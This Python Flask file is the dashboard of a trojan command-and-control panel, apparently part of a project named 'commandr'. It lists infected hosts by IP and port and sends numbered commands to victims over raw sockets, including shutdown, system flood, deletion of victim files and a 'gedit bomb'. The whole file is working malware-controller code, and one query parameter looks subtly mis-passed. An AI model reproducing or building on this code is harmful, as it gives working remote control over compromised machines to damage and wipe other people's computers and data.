# Code for this file taken and adapted from:
# http://flask.pocoo.org/docs/1.0/tutorial/blog/

import os
import socket

from flask import (
    Blueprint, flash, g, redirect, render_template, request, url_for
)
from werkzeug.exceptions import abort

from commandr.auth import login_required
from commandr.db import get_db

bp = Blueprint('dashboard', __name__)

@bp.route('/', methods=('GET', 'POST'))
def index():
    db = get_db()
    trojans = db.execute(
        'SELECT id, logged_text, ip, port, status, last_updated'
        ' FROM trojan ORDER BY id ASC'
    ).fetchall()

    if request.method == 'POST':
        #print(request.form)

        # Trojan Action: System Flood, Gedit Bomb, etc.
        if 'action' in request.form:
            trojan_id = request.form['trojan_id']
            ip = request.form['ip']
            port = request.form['port']
            action = request.form['action']
            status = request.form['status']
            error = None
            action_str = None

            if int(action) == 1:
                action_str = '"shutdown"'
            elif int(action) == 2:
                action_str = '"system flood"'
            elif int(action) == 3:
                action_str = '"delete victim files"'
            elif int(action) == 4:
                action_str = '"gedit bomb"'

            if int(status) == 0:
                error = 'Trojan must be on before a command is sent to it.'

            if error is not None:
                flash(error, 'danger')
            else:
                send_data(trojan_id, str(action))
                flash('Trojan {} located at {}:{} sent a {} command to the victim.'.format(trojan_id, ip, port, action_str), 'success')

            return redirect(url_for('dashboard.index'))

        # Power On/Off
        if 'power' in request.form:
            status = request.form['status']
            trojan_id = request.form['trojan_id']

            # Status toggle
            #status = 1 - int(status)

            # Status off
            status = 0

            db = get_db()
            db.execute(
                'UPDATE trojan SET status = ?,'
                ' last_updated = CURRENT_TIMESTAMP WHERE id = ?',
                (status, trojan_id))
            db.commit()

            try:
                send_data(trojan_id, '5')
            except ConnectionRefusedError:
                flash('Trojan {} is turned off. No socket connection available.'.format(trojan_id), 'danger')

            return redirect(url_for('dashboard.index'))

        # Delete
        if 'delete' in request.form:
            status = int(request.form['status'])
            trojan_id = request.form['trojan_id']
            error = None

            if status:
                error = 'Trojan needs to be shut down before it can be deleted.'

            if error is not None:
                flash(error, 'danger')
            else:
                db = get_db()
                db.execute('DELETE FROM trojan WHERE id = ?', (trojan_id,))
                db.commit()
                return redirect(url_for('dashboard.index'))

    return render_template('dashboard/index.html', trojans=trojans)

def send_data(trojan_id, action):
    db = get_db()
    result = db.execute(
        'SELECT ip, port FROM trojan WHERE id = ?', (trojan_id)
    ).fetchone()

    ip = result['ip']
    port = result['port']
    sending_soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sending_soc.connect((ip, port))
    encodedAction = action.encode()
    sending_soc.send(encodedAction)
    sending_soc.close()
